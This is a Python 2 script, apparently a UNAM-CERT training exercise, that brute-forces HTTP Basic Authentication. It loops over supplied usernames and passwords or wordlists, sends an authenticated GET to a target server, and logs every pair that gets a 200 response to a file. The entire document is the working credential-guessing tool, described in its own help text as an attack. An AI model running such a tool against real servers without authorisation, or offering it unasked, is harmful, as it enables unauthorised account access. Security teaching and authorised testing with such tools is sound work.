#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError


def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    parser.add_option('-D', '--users_file', dest='users_file', default=None, help='Get users from the specified file.')
    parser.add_option('-F', '--passwords_file', dest='passwords_file', default=None, help='Get passwords form the specified file.')
    parser.add_option('-o', '--output_file', dest='output_file', default='salida.txt', help='Output file.')
    parser.add_option('-v', '--verbose', dest='verbosee', default=False, help='Show more info about the test process.', action='store_true')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)


def getFileLines(name):
    with open(name,'r') as data_file:
        return [e[:-1] for e in data_file.readlines()]


def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url

def correctInput(user, users, password, passwords):
    if user and users:
        printError('Can\'t specify users file and an user ', True)
    if password and passwords:
        printError('Can\'t specify passwords file and a password ', True)
    
def getCredentials(url, users, passwords, verbose, file_output):
    with open(file_output, 'w') as fl: 
        if verbose:
            for user in users:
                for password in passwords:
                    print 'Testing user:%s  password:%s '%(user,password)
                    if makeRequest(url, user, password):
                        print '\tCredenciales correctas'
                        fl.write(user+'\t'+password+'\n')
                    else:
                        print '\tCredenciales incorrectas'
        else:
            for user in users:
                for password in passwords:
                    if makeRequest(url, user, password):
                        fl.write(user+'\t'+password+'\n')


def buildData(user, users, password, passwords):
    if user and password:
        return [user],[password]
    elif user and passwords:
        return [user], getFileLines(passwords)
    elif users  and password:
        return getFileLines(users),[password]
    elif users and passwords:
        return getFileLines(users), getFileLines(passwords)
    else:
        printError('Data input error!',True)
    

def makeRequest(host, user, password):
	try:
		response = get(host, auth=(user,password))
		if response.status_code == 200:
                        return True
		else:
                        return False
	except ConnectionError:
		printError('Error en la conexion, tal vez el servidor no esta arriba.',True)

if __name__ == '__main__':
    #try:
        opts = addOptions()
        checkOptions(opts)
        correctInput(opts.user, opts.users_file, opts.password, opts.passwords_file)
        url = buildURL(opts.server, port = opts.port)
        users , passwords = buildData(opts.user, opts.users_file, opts.password, opts.passwords_file)
        getCredentials(url, users, passwords, opts.verbosee, opts.output_file)

        
        
        #makeRequest(url, usa[:-1] , pa[:-1])
    
    #except Exception as e:
       # printError('Ocurrio un error inesperado')
       # printError(e, True)
